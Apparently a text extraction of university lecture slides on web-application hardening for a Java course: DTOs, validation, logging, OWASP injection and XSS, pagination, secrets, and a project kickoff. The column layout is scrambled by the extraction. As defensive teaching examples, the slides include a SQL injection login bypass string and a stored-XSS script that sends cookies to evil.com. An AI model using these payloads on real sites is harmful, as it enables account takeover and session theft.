@@ -1,0 +1,333 @@
+ICSI486 Software Construction
+Week 11:
+Web - App Best Practices
+& Project Kickoff
+Hardening the Monolith
+Batnyam Battulga, Ph.D., Dipl. -Ing., Dipl. -Inf.
+Instructor & Course Leader
+2026-04-13
+
+Week 10
+A quick recap: APIs & REST
+API Connectivity
+APIs connect machines . They define the contract governing data exchange between systems.
+REST Principles
+Statelessness and a focus on resources are the key pillars.
+HTTP Verben & CRUD
+Mapping : GET, POST, PUT, DELETE in accordance with
+CRUD.
+JSON Data
+The universal data format, typically processed in Java using the Jackson library.
+ICSI486 Software Construction 2 / 25
+
+Week 11
+Learning Objectives
+Data Transfer Objects (DTOs)
+Why we don’t pass domain objects directly to the web.
+Error Handling & Logging
+Professional debugging instead of System.out.println.
+Knowledge Progress
+Security Awareness
+Architecture (DTOs) New
+Understanding the OWASP Top 10: Effectively defending against XSS and SQL injection.
+Security Hardening Critical
+Performance
+Project Readiness Goal
+Implement pagination for large datasets .
+Project Kickoff
+The “ LibraryWeb or Your Project” milestone has been launched.
+ICSI486 Software Construction 3 / 25
+
+Architecture
+The Big Picture: The Finalized Monolith s r e t p Web UI (Humans) a REST API (Machines) d
+A g Browser -based Interface Mobile / 3rd Party Clients n i v JSP / HTML5 / CSS JSON / Jackson i r D Hexagonal Boundary n i a m Application Core o D s s e Pure Business Logic & Interfaces n i s No Framework Dependencies u B Java POJOs / Service Layer s r e t p Primary Adapter Core Secondary Adapter a d Persistence (Input) (Logic) (Output) A n e Data Storage & Retrieval v i r D JDBC / H2 / SQL ICSI486 Software Construction 4 / 25
+
+Best Practice #1
+Thin Controllers
+The Role of Servlets
+"Thin Controllers,
+Traffic Routing Only
+Fat Services."
+Servlets are "Traffic Police". They accept requests, unpack data, and route to the correct service.
+The Bad Way
+Writing business rules (e.g., calculating late fees, checking stock) directly inside doPost().
+The Good Way
+Read Input → Call Core Service → Return Response.
+No logic in the adapter!
+ICSI486 Software Construction 5 / 25
+
+Best Practice 2
+Data Transfer Objects (DTOs)
+Protection of the Domain
+Never expose the internal core model directly on the web. Decoupling improves security.
+GET /api/user/1
+Domain Object Risks
+// Witout DTO (Domain Leak)
+{
+Entity classes often contain sensitive data such as password hashes or
+"id": 42, internal IDs , which are none of the client’s business.
+"username": "admin",
+"passwordHash": "e10adc3949...",
+"role": "SUPER_ADMIN"
+DTO Pattern }
+UserResponseDTO contains only secure fields (e.g. username, email). // With UserResponseDTO It is purely a data container with no logic. { "username": "admin", "email": "contact@library.com" Web Adapter Mapping } The adapter layer converts domain objects into DTOs before they are serialised as JSON.
+ICSI486 Software Construction 6 / 25
+
+Security Risk
+The Over - Posting Problem
+Why DTOs for Input-
+Mass Assignment Vulnerability
+Hackers can inject fields like isAdmin: true into
+JSON payloads using tools like Postman, even if your
+HTML form doesn't show them.
+The Direct Mapping Flaw
+If you map JSON directly to your database entity
+(User), frameworks often blindly copy all matching fields, overwriting sensitive data.
+The DTO Solution
+Use a specific UserCreateDTO that only contains safe fields. Any extra data sent by the hacker is simply ignored.
+ICSI486 Software Construction 7 / 25
+
+Best Practice 3
+Input Validation
+Trust No One
+Never trust user input. Treat all external input as potentially malicious and tampered with.
+Client -Side (HTML5)
+Attributes such as <input type="email" required> improve the user experience but offer no security whatsoever. They can easily be bypassed in the browser.
+Server -Side (Java)
+Validation must take place within the servlet before data reaches the business logic or database.
+ICSI486 Software Construction 8 / 25
+
+Validation Logic
+Serverseitige Validierung: Fail Fast
+The Principle
+"Fail Fast" means verifying preconditions immediately upon entry. If inputs are invalid, stop execution instantly.
+Prevents bad data from reaching the Core
+Saves processing resources
+Avoids deep nesting (Arrow Code)
+HTTP 400 Bad Request
+Standard response for client errors. Never return 200 OK with an error message in the body!
+ICSI486 Software Construction 9 / 25
+
+Security & UX
+Error handling: Hide stack traces!
+1 <web-app xmlns=""......"">
+Information Disclosure 2
+3 <!--Catch specific HTTP Status Codes -->
+Tomcat’s standard error pages (HTTP 500) often reveal 4 <error-page> stack traces, server versions and Java paths. This is 5 <error-code>404</error-code> valuable information for attackers.
+6 <location>/WEB-INF/views/error-404.jsp </location>
+7 </error-page>
+8
+9 <error-page>
+The Solution: Global Error Pages
+10 <error-code>500</error-code>
+11 <location>/WEB-INF/views/error.jsp </location>
+In the web.xml file, configure generic error pages that 12 </error-page> help the user without revealing internal details.
+13
+14 <!--Catch Unhandled Java Exceptions -->
+Prevents reconnaissance by hackers 15 <error-page>
+16 <exception-type> java.lang.Throwable </exception-type>
+Professional design instead of ‘Tomcat grey’
+17 <location>/WEB-INF/views/error.jsp </location>
+Consistent user experience (UX)
+18 </error-page>
+19
+20 </web-app>
+ICSI486 Software Construction 10 / 25
+
+Logging
+Logging: Stop using System.out.println
+BadServlet.java
+Cannot be configured
+In production, System.out cannot be disabled or filtered. Debug
+// BAD: No context, no timestamp messages are flooding the log.
+try { processOrder(orderId);
+No log levels } catch (Exception e) {
+// StdErr
+It is not possible to distinguish between INFO, WARN or ERROR. System.out.println("Error happened!"); } Inefficient & Unreliable // BAD: Cannot turn off in Prod System.out.println("User clicked..."); Blocking I/O (synchronous). On servers such as Tomcat, stdout output often goes nowhere (the ‘ catalina.out ’ mess).
+ICSI486 Software Construction 11 / 25
+
+Professional Logging
+Standard - Logging - Frameworks
+SLF4J + Logback
+Use SLF4J (Simple Logging Facade for
+Java) as the interface and Logback as the implementation engine.
+Levels: Filter by INFO, DEBUG, ERROR
+Performance: Async writing to files
+Placeholders: No string concatenation
+Configuration
+Control output via logback.xml. Switch from Console (Dev) to File (Prod) without changing Java code.
+// 4. ERROR: Critical failures with stacktrace
+23 }
+ICSI486 Software Construction 12 / 25 logger.error("Database connection failed", e);
+
+New Topic
+Security &
+OWASP Top 10
+The definitive global guide to web application security risks. We focus on the most critical flaws for Java developers.
+Injection Flaws Broken Auth XSS
+ICSI486 Week 11 // Hardening the Monolith
+
+OWASP A03: Injection
+SQL Injection (Review)
+The Vulnerability Anatomy
+"Always use
+Malicious Input
+PreparedStatements!"
+User enters: admin' OR '1'='1 into the login field.
+LoginRepository.java
+The Resulting Query
+Logic is altered: SELECT * FROM users WHERE user =
+'admin' OR '1'='1' 1 // BAD: String Concatenation
+2 String sql = "SELECT * FROM users WHERE u = '" + input + "'";
+3
+Consequence
+4 // GOOD: Parameterized Query
+Since '1'='1' is always true, the database returns
+5 String sql = "SELECT * FROM users WHERE u = -"; all users, logging the attacker in as Admin. 6 PreparedStatement stmt=conn.prepareStatement(sql); 7 stmt.setString(1, input); // Safe!
+8
+9 ResultSet rs = stmt.executeQuery();
+ICSI486 Software Construction 14 / 25
+
+OWASP Top 10
+Cross - Site Scripting (XSS)
+Attack scenario : Stored XSS
+" Data is interpreted as code."
+1. The injection
+A user posts a book review using JavaScript :
+<script>stealCookie();</script> rendered_page.html (Browser View)
+2. Persistence
+1 <div class="review">
+The database simply stores the script as plain text. The server ‘trusts’
+2 <h3>User: Hacker1337</h3> the input.
+3 <p>Ttolles Buch!
+4 <!-- Der Browser führt das aus! -->
+5 <script>
+3. Execution
+6 window.location =
+7 'http://evil.com-c=' + document.cookie;
+When other users load the page, their browser executes the script!
+(Cookie theft) 8 </script>
+9 </p>
+10 </div>
+ICSI486 Software Construction 15 / 25
+
+Output Escaping
+Protection against XSS
+Escape Output!
+Never render user input directly as raw HTML. Use
+JSTL tags to automatically convert dangerous characters into harmless HTML entities.
+<becomes &lt;
+>becomes &gt;
+Script tags display as text, not code
+Danger Zone
+Directly using Expression Language ${} in JSP without escaping allows scripts to execute.
+${user.bio} (Vulnerable !)
+ICSI486 Software Construction 16 / 25
+
+Performance & Scalability
+Never Fetch
+EVERYTHING
+SELECT * FROM books works fine with 10 books on localhost. But in production with 1,000,000 rows , it causes Out of Memory errors and crashes your server instantly.
+Latency Memory Leaks Server Crash
+ICSI486 Week 11 // Hardening the Monolith
+
+Performance
+Pagination
+Chunks vs. Everything
+Performance Impact
+Fetching 1 million rows causes Out of Memory errors. Fetching 20 rows is instant.
+API Contract
+Translates to SQL
+The client requests a specific page index and size (e.g., page 1, 20 items) via URL parameters.
+Database Efficiency
+Use SQL LIMIT and OFFSET to skip rows at the database engine level, saving memory.
+ICSI486 Software Construction 18 / 25
+
+Security Best Practice
+Managing Secrets
+The Golden Rules
+"Code is Public.
+Hardcoding Secrets
+Configuration is Private."
+Never write passwords, API keys, or tokens directly in
+Java Strings. Decompilers can read them easily.
+Git Leaks
+Never push credentials (even in comments) to GitHub.
+Bots scan public repositories in seconds.
+Environment Variables
+Inject secrets at runtime via the OS or Container. The code remains clean and secure.
+ICSI486 Software Construction 19 / 25
+
+Summary
+1. Use DTOs 2. Validate everything
+Best
+Separates domain models from Trust no one. Check everything the API. Prevents the leakage of on the server using the ‘fail internal data (passwords). fast’ principle.
+Practices
+Six principles for clean, production-ready code. Security 3. Log cleanly 4. Security Awareness and maintainability are the top Use SLF4J + Logback instead Protection against SQL injection of System.out. Separate INFO (prepared statements) and XSS priorities.
+from ERROR. (escaping).
+6. Hide your secrets/ Secrets
+5. Pagination Management
+Load large amounts of data in No passwords in the code! Use small chunks (‘pages’) to environment variables for conserve memory. database credentials.
+20 / 25
+
+Project Kickoff
+Project 2:
+LibraryWeb
+The Ultimate Monolith. Goal: Combine Weeks 1 through 12 into a single, polished Application. This is the foundation before Cloud migration.
+Hexagonal Arch Persistence Teamwork
+ICSI486 Week 11 // Hardening the Monolith
+
+Project Kickoff
+Projekt 2: LibraryWeb Scope
+Hexagonal Architecture (Strict!)
+The core (business logic) must be completely isolated. No
+Web UI (JSP) REST API external dependencies.
+Persistent H2 Database
+Use of the H2 database with pure JDBC. No ORM frameworks CORE (Domain Logic) allowed!
+Secure Session -Management
+JDBC Adapter
+Implementation of the Bouncer pattern for login and access control.
+Hybrides Interface
+H2 Database
+Web UI (JSP/HTML) for Librarians) and REST API for Mobile
+Clients (JSON).
+ICSI486 Software Construction 22 / 25
+
+Project 2
+Teamwork & Git Workflow
+Collaborative Engineering
+Working in pairs. Pair programming promotes knowledge sharing and improves code quality.
+Approved
+Merge PR
+Feature Branch Workflow
+Never push directly to main. Use branches such as feature/login for each new feature. feature/loginReview Code Pull Requests (PRs) The ‘gatekeeper’ for your code. A pull request must be created before code is merged into the main branch.
+main
+Code Reviews Der Git Flow: Branch → Commit → Pull Request →
+Review → Merge
+The partner must review and approve the PR. Find any bugs before they go into production.
+ICSI486 Software Construction 23 / 25
+
+Projekt 2
+Grading
+30% 30%
+Rubric
+Architecture Functionality
+Clear separation of layers
+Full CRUD functionality, a fully
+(hexagonal). Correct use of DTO s for operational web interface for decoupling.
+librarians and a REST API for clients.
+Transparente Kriterien für eure Note.
+Wir bewerten nicht nur das Ergebnis, sondern auch den Weg dorthin.
+20% 20%
+Security & Error Handling Code Quality
+Protection against XSS and SQLi. Professional naming conventions,
+Bouncer pattern for login. No stack clean code principles and a clean Git traces in the UI. workflow (PRs).
+24 / 25
+
+Week 11 Complete
+Questions -
+Clarifications on Architecture, Security, or Requirements.
+SYSTEM STATUS: ACTIVE
+Project 2 starts NOW!
+Repo setup & Team formation // Lab Mission
+ICSI486 Software Construction // Instructor: Batnyam Battulga, Ph.D.
